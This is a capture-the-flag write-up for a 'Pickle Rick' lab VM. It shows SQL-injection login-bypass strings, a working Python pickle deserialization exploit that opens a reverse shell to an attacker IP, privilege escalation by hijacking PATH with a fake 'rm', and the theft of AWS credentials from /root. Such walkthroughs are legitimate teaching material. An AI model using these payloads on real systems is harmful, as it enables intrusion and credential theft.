---
description: Yes, the icon is a cucumber
---

# 🥒 Pickle Rick

## Description

> Rick has turned himself into a pickle, can you find him before its too late...
>
> Download: [https://drive.google.com/file/d/1ZULGK4p7cJQHNabmDHdtki-g1xNfHu0f/view?usp=share\_link](https://drive.google.com/file/d/1ZULGK4p7cJQHNabmDHdtki-g1xNfHu0f/view?usp=share\_link)
>
> Alternative Download Link: [https://drive.google.com/file/d/1ZTp8qBLRfjitet8nOshTiqIwWDwonCh1/view?usp=share\_link](https://drive.google.com/file/d/1ZTp8qBLRfjitet8nOshTiqIwWDwonCh1/view?usp=share\_link)
>
> 7z Password: \&y9PBYf8gZ^996s9

## TL;DR

* Scan victim machine with nmap to find http running on port 5000
* The website allows uploading of pickle files, upload a pickle RCE reverse shell payload
* Privesc from sudo /opt/clean\_pickle.sh, replacing PATH env to a dir containing a file named 'rm', which creates a shell as root
* Get aws creds from /root dir
* Login to aws using aws cli and list the files in the storage, flag is in the container.

## Solution

### Setup

Unzipping the 7zip file with the password given, we are returned with a `pickle-shop.ova` file which we can open as a virtual machine in VMWare.

After opening it, we start the virtual machine and we are prompted with a login screen. Since we don't know the password, we cannot login.

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption><p>Login Screen</p></figcaption></figure>

Let's treat this as a hackthebox kind of challenge. We will open an attacker vm, configure both machines to be in the same network, then nmap the victim machine to see what ports are open.

To configure both vms to be in the same network in VMWare, we have to go to the **VM tab > Settings > Network Adapter**, then select **Custom > VMnet0**. Do the same for the attacker machine.

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption><p>Network Config</p></figcaption></figure>

Now the attacker and victim machines are in the same network, we can run `ip addr` on the attacker machine to check the network we are in.

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption><p>ip address</p></figcaption></figure>

For me, my machine's ip address is `192.168.10.133` and it is in the `192.168.10.0.24` network.

To find the ip address of the victim machine, we can just do a ping sweep of the network by running `nmap -sP 192.168.10.1-255`. This command tells us which hosts are up.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>pickle-shop ip addr</p></figcaption></figure>

In my case, the victim's machine ip address is `192.168.10.142`. We now scan for open ports and their services by running `nmap -sC -sV -T4 -p- 192.168.10.142`.

<details>

<summary>nmap result</summary>

```
tarting Nmap 7.92 ( https://nmap.org ) at 2023-04-17 11:26 EDT
Nmap scan report for pickle-shop (192.168.10.142)
Host is up (0.11s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.10.6
|     Date: Mon, 17 Apr 2023 15:28:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1461
|     Connection: close
|     <html>
|     <head>
|     <title>Login Page</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     text-align: center;
|     font-size: 2em;
|     margin-top: 50px;
|     form {
|     display: inline-block;
|     margin-top: 50px;
|     padding: 20px;
|     border: 1px solid #ccc;
|     border-radius: 5px;
|     box-shadow: 2px 2px 5px #ccc;
|     input[type="text"],
|     input[type="password"] {
|     padding: 10px;
|     font-size: 1.2em;
|     width: 100%;
|     margin-bottom: 20px;
|     border: 1px solid #ccc;
|     border-radius: 5px;
|     input[type="submit"] {
|     padding: 10px 20px;
|     font-size: 1.2em;
|     background-color: lightblue;
|     color: white;
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.92%I=7%D=4/17%Time=643D65B0%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,664,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.10\.6\r\nDate:\x20Mon,\x2017\x20Apr\x202023\x2015:28:48\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:01461\r\nConnection:\x20close\r\n\r\n<html>\n\n<head>\n\x20\x20<title>L
SF:ogin\x20Page</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\
SF:x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;\n\x20\x20\x20\
SF:x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x2
SF:0h1\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\n\x20\x20\x20\x20\
SF:x20\x20margin-top:\x2050px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20form\
SF:x20{\n\x20\x20\x20\x20\x20\x20display:\x20inline-block;\n\x20\x20\x20\x
SF:20\x20\x20margin-top:\x2050px;\n\x20\x20\x20\x20\x20\x20padding:\x2020p
SF:x;\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#ccc;\n\x20\x20\
SF:x20\x20\x20\x20border-radius:\x205px;\n\x20\x20\x20\x20\x20\x20box-shad
SF:ow:\x202px\x202px\x205px\x20#ccc;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x2
SF:0input\[type=\"text\"\],\n\x20\x20\x20\x20input\[type=\"password\"\]\x2
SF:0{\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20
SF:font-size:\x201\.2em;\n\x20\x20\x20\x20\x20\x20width:\x20100%;\n\x20\x2
SF:0\x20\x20\x20\x20margin-bottom:\x2020px;\n\x20\x20\x20\x20\x20\x20borde
SF:r:\x201px\x20solid\x20#ccc;\n\x20\x20\x20\x20\x20\x20border-radius:\x20
SF:5px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20input\[type=\"submit\"\]\x20
SF:{\n\x20\x20\x20\x20\x20\x20padding:\x2010px\x2020px;\n\x20\x20\x20\x20\
SF:x20\x20font-size:\x201\.2em;\n\x20\x20\x20\x20\x20\x20background-color:
SF:\x20lightblue;\n\x20\x20\x20\x20\x20\x20color:\x20white;\n\x20\x20\x20\
SF:x20\x20")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//D
SF:TD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www
SF:\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20con
SF:tent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<tit
SF:le>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20
SF:<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP
SF:/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20exp
SF:lanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x
SF:20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n
SF:");
MAC Address: 00:0C:29:80:47:CE (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.93 seconds
```

</details>

The results show that http is being hosted on port `5000`. Let's visit it through a web browser.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

We find that it is a simple login page. Looking at the source code doesn't return any useful info, so let's perform the usual ritual of trying SQL Injection.

Inputting `"` as the username returns an error message 'why u break my website smh :crying emoji:!'.

We can try the generic payload `"or"1"="1`that returns `true` for logging in, but another error message is returned 'Hacker Detected :skull: x7, mai geh siao, try harder leh'. It seems that this challenge creator is a hard sadist and included a bunch of words in his list of nono words :man\_facepalming::man\_facepalming::man\_facepalming:.

After trying different payloads, the simplest payload that bypasses the login is `"or"` for the username and password.

Now we are logged in and we can upload a pickle :cucumber:.

### Pickle RCE

We know the generic pickle insecure deserialization to RCE, so it is most likely it in this case.

I always refer to this [article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) for python pickle RCE.

So we create our own python pickle serializer according to the article and create a payload that creates a reverse shell.

{% tabs %}
{% tab title="pickle.py" %}
```python
import base64
import codecs
import pickle

class RCE:
    def __reduce__(self):
        import os
        cmd = ("""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.133",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""")
        return os.system, (cmd,)

pickled = pickle.dumps(RCE())

with open('pickle','wb') as f: f.write(pickled)
```
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}

Start a netcat listener, upload the pickle file, and we have a shell!

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption><p>shell</p></figcaption></figure>

### Privesc

The first thing I tried to run is `sudo -l` to check what commands I could run with sudo privilege.

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>sudo -l</p></figcaption></figure>

This states that we can run `/opt/clean_pickle.sh` with root privileges without needing a password. Let's check what is in `clean_pickle.sh`.

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption><p>clean_pickle.sh</p></figcaption></figure>

The bash script uses runs `rm` without an absolute path. What this means is that instead of running `/usr/bin/rm -r ...`, it just runs `rm -r ...`.

This is vulnerable to **Command Forgery**. We abuse this by creating our own `rm` bash script under any directory, in this case we chose the `/tmp` directory. The `rm` file should contain:

```bash
#!/bin/bash
/bin/bash
```

This is to get a shell as root when root executes this `rm` bash script.

Run `chmod 777 /tmp/rm` to make it executable.

Now we can run `sudo PATH=/tmp:$PATH /opt/clean_pickle.sh` to run `clean_pickle.sh` as root, with the modified `PATH` environment variable to where our `rm` resides.

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>privesc</p></figcaption></figure>

And now we have root!

### Pivoting to Cloud

Looking at `/root`, we see there is a `.aws` directory and a `credentials` file inside.

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption><p>aws creds</p></figcaption></figure>

We can sign in to aws cli using  this credential. I modified `~/.aws/credentials` to add the id and key (you will have to install aws cli first). You can also run `aws configure` and input the id and key appropriately.

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>local aws creds</p></figcaption></figure>

Now time to find where the flag actually is.

### Finding the flag

The most common enumeration method for aws cloud is to list the buckets the account have access to. We can run `aws s3api list-buckets` to list the buckets.

The aws key is now sadly revoked and invalid, so I can't show the last few steps.

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p>failure</p></figcaption></figure>

The flag is in one of the buckets and you can just use aws cli to get it.

Unfortunately, there was no pickle rick at all :disappointed\_relieved:
